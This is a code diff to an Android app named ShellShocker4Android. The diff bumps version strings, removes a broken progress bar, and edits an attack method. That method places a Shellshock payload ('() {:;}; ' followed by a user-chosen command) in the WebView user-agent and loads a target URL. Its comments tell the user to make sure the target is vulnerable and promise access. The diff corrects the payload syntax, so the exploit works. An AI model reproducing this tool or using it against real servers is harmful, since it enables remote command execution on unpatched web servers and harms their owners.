@@ -14,8 +14,8 @@ package it.stefanobelli.shellshocker;
  *
  * ShellShocker4Android
  *
- * Status: WIP
- * Version: x.y
+ * Status: ALPHA
+ * Version: 0.2
  *
  * [AndroidManifest.xml for more info(s)]
  */
@@ -34,7 +34,6 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.webkit.WebView;
 import android.webkit.WebSettings;
-import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.util.Log;
@@ -53,7 +52,6 @@ public class MainActivity extends ActionBarActivity {
     String targetString;
     String commandString;
     WebSettings settingsBrowser;
-    ProgressBar showProgress;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -67,12 +65,10 @@ public class MainActivity extends ActionBarActivity {
         webBr = (WebView)findViewById(R.id.browser);
         showConfirmCommand = (TextView)findViewById(R.id.showcommand);
         showConfirmTarget = (TextView)findViewById(R.id.showtarget);
-        showProgress = (ProgressBar)findViewById(R.id.showProgress);
         //Browser, to finish
         settingsBrowser = webBr.getSettings();
         webBr.setWebViewClient(new WebViewClient());
         launch.setEnabled(false);
-        showProgress.setVisibility(View.VISIBLE);
 
     }
 
@@ -99,31 +95,15 @@ public class MainActivity extends ActionBarActivity {
     public void onLaunchAttack(View v){
         /**Launch attack
          *
-         * Before, set somethings :)
          * Be sure target is VULNERABLE
          * This app no return anything.
          * it says you when server comes called
          * and it gives you access
          */
-         Toast t = Toast.makeText(this, "Calling...", Toast.LENGTH_LONG);
+         Toast t = Toast.makeText(this, "Calling: "+targetString, Toast.LENGTH_LONG);
          t.show();
-         settingsBrowser.setUserAgentString("() { :;} "+commandString);
+         settingsBrowser.setUserAgentString("() {:;}; "+commandString);
          webBr.loadUrl(targetString);
-         final int progress = webBr.getProgress();
-         //ProgressBar doesn't work!
-         new Thread(new Runnable(){
-             public void run(){
-                 while(progress < 100){
-                     new Runnable(){
-                         public void run(){
-                             showProgress.setProgress(progress);
-
-                         }
-                     };
-                 }
-
-             }
-         }).start();
     }
 
 
@@ -196,7 +176,7 @@ public class MainActivity extends ActionBarActivity {
     public Dialog getApplicationInfo(Bundle bundle){
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Application Info");
-        builder.setMessage("Status: WIP - Version x.y");
+        builder.setMessage("Status: ALPHA - Version 0.2");
         builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
             @Override
             public void onClick(DialogInterface dialog, int which) {
